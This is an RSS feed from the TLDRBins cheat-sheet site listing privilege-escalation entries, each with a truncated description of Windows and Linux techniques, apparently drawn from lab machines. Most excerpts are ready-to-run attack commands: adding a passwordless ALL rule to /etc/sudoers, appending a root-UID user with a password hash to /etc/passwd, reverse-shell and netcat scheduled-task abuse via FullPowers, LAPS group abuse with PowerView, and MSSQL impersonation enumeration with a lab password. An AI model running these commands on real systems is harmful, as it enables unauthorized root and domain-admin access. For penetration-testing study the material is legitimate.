<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Privilege Escalation on TLDRBins</title>
    <link>https://tldrbins.github.io/@privilege-escalation/</link>
    <description>Recent content in Privilege Escalation on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent-Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check Trust Relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a New User Account and Add it to LAPS (Local Administrator Password Solution) Group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a Cred Object (Runas) [Optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a New User Password Object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
    </item>
    <item>
      <title>AD Recycle Bin</title>
      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
      <description>Privesc #1: Restore Deleted AD Object Windows 1. Import AD Module Import-Module activedirectory *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; import-module activedirectory 2. Query All Deleted Objects within Domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects Deleted : True DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com Name : Another User DEL:ebe15df5-e265-45ec-b7fc-359877217138 ObjectClass : user ObjectGUID : ebe15df5-e265-45ec-b7fc-359877217138 3. Get All Details for the Deleted Object Get-ADObject -filter { SAMAccountName -eq &amp;#39;&amp;lt;DELETED_USER&amp;gt;&amp;#39; } -includeDeletedObjects -property * *Evil-WinRM* PS C:\Users\test.</description>
    </item>
    <item>
      <title>Disk Group</title>
      <link>https://tldrbins.github.io/disk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/disk/</guid>
      <description>General # Show devices lsblk $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 12G 0 disk ├─sda1 8:1 0 120M 0 part /boot ├─sda2 8:2 0 1K 0 part └─sda5 8:5 0 11.9G 0 part ├─Kotarak--vg-root 252:0 0 7G 0 lvm / └─Kotarak--vg-swap_1 252:1 0 1G 0 lvm [SWAP] sr0 11:0 1 1024M 0 rom # Device attributes blkid $ blkid /dev/sda1: UUID=&amp;#34;67e178a9-1b2a-407e-8d3f-7b1772bab2be&amp;#34; TYPE=&amp;#34;ext2&amp;#34; PARTUUID=&amp;#34;1b9f3540-01&amp;#34; /dev/sda5: UUID=&amp;#34;LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD&amp;#34; TYPE=&amp;#34;LVM2_member&amp;#34; PARTUUID=&amp;#34;1b9f3540-05&amp;#34; /dev/mapper/Kotarak--vg-root: UUID=&amp;#34;efb44a28-8edc-4d40-aca3-81e57d58d759&amp;#34; TYPE=&amp;#34;ext4&amp;#34; /dev/mapper/Kotarak--vg-swap_1: UUID=&amp;#34;162b2913-7dcf-4ba7-bddc-238a22f16e52&amp;#34; TYPE=&amp;#34;swap&amp;#34; # Show device mapping ls -l /dev/mapper/ $ ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 236 Sep 22 23:22 control lrwxrwxrwx 1 root root 7 Sep 22 23:22 Kotarak--vg-root -&amp;gt; .</description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Enum Linux Windows 1. List Users that Can be Impersonated nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_impersonate $ nxc mssql DC.REDELEGATE.VL -u &amp;#39;SQLGuest&amp;#39; -p &amp;#39;zDPBpaF4FywlqIv11vii&amp;#39; --local-auth -M enum_impersonate MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.129.254.242 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii ENUM_IMP... 10.129.254.242 1433 DC [-] No users with impersonation rights found. 2. Enumerate Active MSSQL Logins nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_logins $ nxc mssql DC.</description>
    </item>
    <item>
      <title>SeImpresonate</title>
      <link>https://tldrbins.github.io/seimpresonate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seimpresonate/</guid>
      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover Tokens via Schedule Tasks # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
    </item>
    <item>
      <title>SeLoadDriverPrivilege</title>
      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
      <description>Abuse #1: Install a Malicious Driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
    </item>
    <item>
      <title>Sudoers</title>
      <link>https://tldrbins.github.io/sudoers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sudoers/</guid>
      <description>Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
    </item>
    <item>
      <title>Windows Services</title>
      <link>https://tldrbins.github.io/server_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/server_operators/</guid>
      <description>Check Unquoted Service Path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check Service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ---[SNIP]--- ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None ---[SNIP]--- Ref: Get-ServiceAcl.</description>
    </item>
    <item>
      <title>Writable /etc/passwd</title>
      <link>https://tldrbins.github.io/passwd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/passwd/</guid>
      <description>Abuse #1: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo &amp;#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # Get root shell su - user </description>
    </item>
  </channel>
</rss>
